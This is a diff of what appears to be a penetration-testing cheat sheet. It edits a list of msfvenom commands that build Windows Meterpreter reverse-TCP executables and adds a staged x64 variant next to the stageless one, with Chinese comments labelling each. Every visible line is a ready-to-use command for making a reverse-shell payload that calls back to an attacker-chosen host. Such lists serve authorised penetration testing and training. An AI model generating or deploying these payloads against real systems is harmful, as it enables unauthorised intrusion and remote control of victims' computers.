@@ -36,8 +36,9 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.
 meterpreter
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe
- 
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe  # 不分段
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe  #分段
 ```
 
 
